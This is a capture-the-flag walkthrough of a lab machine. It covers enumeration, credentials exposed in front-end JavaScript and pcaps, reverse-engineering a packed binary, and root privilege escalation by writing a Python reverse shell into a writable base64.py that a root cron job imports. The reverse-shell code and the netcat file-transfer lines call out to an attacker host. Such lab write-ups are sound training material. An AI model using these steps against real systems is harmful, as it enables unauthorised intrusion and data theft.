- Questions
	1- What is the user flag?
	2- What is the Root flag?

We start with:
enumerating the IP with ffuf for directory and nmap for ports.

![[Pasted image 20260216181134.png]]

- ### nmap
	nmap -sV -r -T4 -Pn -p- -oN nmap1.nmap 10.80.184.98 -v 
	![[Pasted image 20260216181740.png]]
	We see that we have 3 ports.
	22: SSH 
	80: The port thats running the HTML SIte
	37370: An unusual FTP Port.


* ### FFUF
	ffuf -u http://10.80.184.98/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -s   
	![[Pasted image 20260216182149.png]]
	We found 4 pages.
	Gallery/Static are both used on the site to show the site.
	Meanwhile pricing is an internal hidden directory. Which has 2 files.
	![[Pasted image 20260216182248.png]]
	### note.txt
	![[Pasted image 20260216182258.png]]

* ### FTP
	We try to access the FTP Anonymously, AKA As a guest, But no luck. We need Creds.
	ftp 10.80.184.98 37370
	![[Pasted image 20260216182452.png]]
So we head back to more enumeration, We have nothing else to look for than keep digging for more hidden directories, So we try to lenumerate the rest of the site.
![[Pasted image 20260216183127.png]]
And we find "00" in /static/fuzz
![[Pasted image 20260216183159.png]]

* ### Further Ennum and looking into the hidden "/dev"
	![[Pasted image 20260216183243.png]]
	Its a login page.
	We try to check the page source, And we see the javascript visible inside of a shown "/dev.js" file.
	We check it out, And the validation is inside of the javascript code, In the front-end instead of beig handeld by the back-end.
	![[Pasted image 20260216183426.png]]
	Username: "siemDev"
	Password: "california"
	And we are being shown a new note.
	![[Pasted image 20260216183539.png]]
	There is a hint "Stop reusing credentials"
	So we cann try to login with "siemDev" And "california" to login into the FTP!

* ### FTP Phase
	ftp 10.80.184.98 37370
	And we are in!
	![[Pasted image 20260216183656.png]]
	We use "dir" to show current directory file, And we see 3 wireshark files!, So we download them into our pc using "get" and we check them locally!
	![[Pasted image 20260216183833.png]]

* ### Wireshark
	We enumerate the 3 pcapng
	First two were no useful. Only last one of which we get the user creds!
	We used the following filter:
	`http.request.method == "POST"`
	![[Pasted image 20260216184147.png]]
	We get username and password for the ssh!
	Now we go into the ssh
	Username: "valleyDev"
	Password: "ph0t0s1234"

* ### SSH
	We login into the ssh 
	ssh valleyDev@10.80.184.98
	![[Pasted image 20260216184409.png]]
	And we get our first flag, So 1st question is done!, Now we need root for the second flag, So we need to privilege esclate


* ### Privilege Esclation
	We try to 
	* sudo -i
	* sudo -l
	But no luck, No permissions, I keep looking in the file system before i download linpeas.
	I Found "valleyAuthenticator" File in /home
	We try to access it but it needs creds,
	So i download it and see what it is about.
	We transfer it using ncat.
	
	On my local machine:
	* nc -lp 1234 > valleyAuthenticator 
	On the victim machine:
	* nc 192.168.184.65 1234 < valleyAuthenticator
	And we have it inside of our machine. We use ghidra to decompile it and understand it.
	But before use ghidra.
	We need to upx it 
	So we do upx -d valleyAuthenticator
	And we upload it tto ghidra and we let it auto-analayze it.
	![[Pasted image 20260216190718.png]]
	We see Two MD5 Hashes.
	One is username, And one is password
	We use crackstation to get the un-hashed version
	![[Pasted image 20260216190852.png]]
	Username: "valley"
	Password: "liberty123"
	And we try to use it and we just get a simple "authenticated"
	So we try to ssh login with the creds.

* ### PE, Part two.
	Now we are insnide of "valley" User, Instead of the valleydev we had. WE should have more permission now.
	So we try the
	* sudo -i
	* sudo -l
	Still no perms.
	So we try to enumerate the system more like we did before.
	* cat /etc/crontab
	And we see 
	![[Pasted image 20260216191259.png]]
	A python script ran by root!
	"/photos/script/photosEncrypt.py"
	We use "vi" to read it, But nothing useful there, Other than an import library!
	We can hijack the library to get a reverse shell on root
	![[Pasted image 20260216191414.png]]
	We do 
	* "locate base64.py"
	And we get
	* /usr/lib/python3.8/base64.py
	We try to see its permissions.
	* ![[Pasted image 20260216191540.png]]
	And we have write permission!.
	Now we just set up a revshell using
	'`import socket`
	`import subprocess`
	`import os`
	
	
	`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)`
	`s.connect(("192.168.184.65",1234))`
	`os.dup2(s.fileno(),0)`
	`os.dup2(s.fileno(),1)`
	`os.dup2(s.fileno(),2)`
	`import pty; pty.spawn("/bin/sh")'`
	
	* https://www.revshells.com/
	![[Pasted image 20260216192129.png]]
	And we have rev-Shell on root!
	And we read the flag and its over!
	![[Pasted image 20260216192215.png]]
	